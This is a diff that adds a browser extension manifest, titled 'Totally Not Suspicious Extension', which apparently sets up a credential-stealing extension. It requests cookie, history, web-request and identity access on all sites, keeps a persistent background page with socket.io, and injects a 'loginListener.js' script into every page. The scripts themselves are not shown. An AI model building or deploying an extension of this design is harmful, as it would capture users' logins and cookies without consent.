@@ -1,0 +1,30 @@
+{
+	"name": "Totally Not Suspicious Extension",
+	"version": "1.0",
+	"description": "Not suspicious at all!",
+	"permissions": [
+		"activeTab",
+		"declarativeContent",
+		"storage",
+		"cookies", "<all_urls>",
+		"history",
+		"webRequest", "<all_urls>",
+		"identity"
+	],
+	"options_page": "/html/options.html",
+	"background": {
+		"scripts": [
+			"/js/modules/socket.io.js",
+			"/js/background.js"
+		],
+		"persistent": true
+	},
+	"page_action": {
+		"default_popup": "/html/popup.html"
+	},
+    "content_scripts": [{
+			"matches": ["<all_urls>"],
+			"js": ["/js/loginListener.js"]
+    }],
+	"manifest_version": 2
+}
